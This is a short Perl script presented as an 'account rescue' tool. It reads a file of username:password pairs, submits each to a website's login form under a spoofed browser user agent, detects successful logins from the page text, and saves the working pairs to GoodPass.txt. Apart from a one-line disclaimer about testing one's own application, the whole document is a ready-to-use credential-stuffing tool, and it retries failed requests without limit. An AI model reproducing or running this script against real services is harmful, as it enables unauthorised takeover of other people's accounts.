#!/usr/bin/perl
# Simple Account Rescue v1 by
# Konrad Rutkowski
# Please use it to test YOUR own application security!
# Do not try to steal someone's account!


use LWP::UserAgent;

$ua = LWP::UserAgent->new;
$ua->agent("Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)");

Start();

print "REMEMBER password file have to contain user:password every line:\n ";
print "user1:password1\n ";
print "user2:qwerty\n ";
print "ETC \n";
$passwordfile = 'C:\pass.txt';
open(FILE, $passwordfile) or die("Cannot open the password file\n");
my @lista = <FILE>;
close(FILE);
foreach $hasla (@lista)
{
$hasla =~ s/^\s+//;
$hasla =~ s/\s+$//;

unless($hasla =~ m/(.*?):(.*?)(\ |$)/g){next;}
my $login = $1;
my $password = $2;
s1:
$ua = LWP::UserAgent->new;
$ua->agent("Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)");
print "[x] Login: $login\nHaslo: $password\n";

$ua->default_headers->push_header('Referer' => 'http://testwebsite.com/loginpage",');
      my $response = $ua->post( "http://testwebsite.com/loginpage", {"account_login" => $login, "password_login" => $password });
      if ($response->is_success) {
         #Content of page when you are not logged
if ($response->content =~ m/Please enter your account name and your password/i) {
print "Wrong password!\n";
sleep(1);
next;
}
}
         #Content of page after logging in
         if($response->content =~ m/Welcome to your account/i) {
            $mfound++;
print "Found the account!\n";
open(FILE, ">>GoodPass.txt");
print FILE "$hasla\n";
close(FILE);
}

else {
print "Retry ".$response->status_line."\n";
goto s1;
}
}
sub Start() {
   system(cls);
   print "\n\n+----------------------+\n";
   print "|== Konrad Rutkowski ==|\n";
   print "+----------------------+\n\n";
}